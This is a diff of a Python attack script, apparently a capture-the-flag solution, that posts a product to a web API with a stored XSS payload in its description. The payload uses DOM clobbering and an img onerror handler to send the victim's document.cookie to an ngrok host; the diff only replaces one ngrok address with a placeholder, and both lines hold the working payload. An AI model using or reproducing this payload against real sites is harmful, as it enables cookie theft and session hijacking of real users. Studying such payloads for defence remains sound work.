@@ -55,7 +55,7 @@ def main():
 
     r = s.post(f'http://{host}/api/products/add', json={
         'product_name': 'asdf',
-        'product_desc': '''<a id="potionTypes"></a><img id="1" name="potionTypes" src="cid:x\\' onerror='fetch(`http://8eb0-81-61-215-163.ngrok.io/`+document.cookie,{mode:`no-cors`})'">''',
+        'product_desc': '''<a id="potionTypes"></a><img id="1" name="potionTypes" src="cid:x\\' onerror='fetch(`http://abcd-12-34-56-78.ngrok.io/`+document.cookie,{mode:`no-cors`})'">''',
         'product_price': '123',
         'product_category': '1',
         'product_keywords': 'asdf',
